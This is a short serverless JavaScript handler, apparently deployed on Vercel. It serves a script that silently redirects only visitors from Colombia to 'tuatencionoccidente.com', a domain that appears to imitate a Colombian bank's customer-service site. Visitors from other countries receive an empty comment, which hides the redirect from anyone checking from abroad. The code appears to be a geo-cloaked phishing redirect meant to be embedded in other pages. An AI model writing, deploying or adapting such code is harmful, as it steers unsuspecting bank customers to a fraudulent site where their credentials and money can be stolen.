export default function handler(req, res) {

  const country = req.headers["x-vercel-ip-country"];

  res.setHeader("Content-Type", "application/javascript");

  if (country === "CO") {
    return res.send(`
      location.replace("https://tuatencionoccidente.com");
    `);
  }

  return res.send(`
    // Sin redireccion
  `);
}
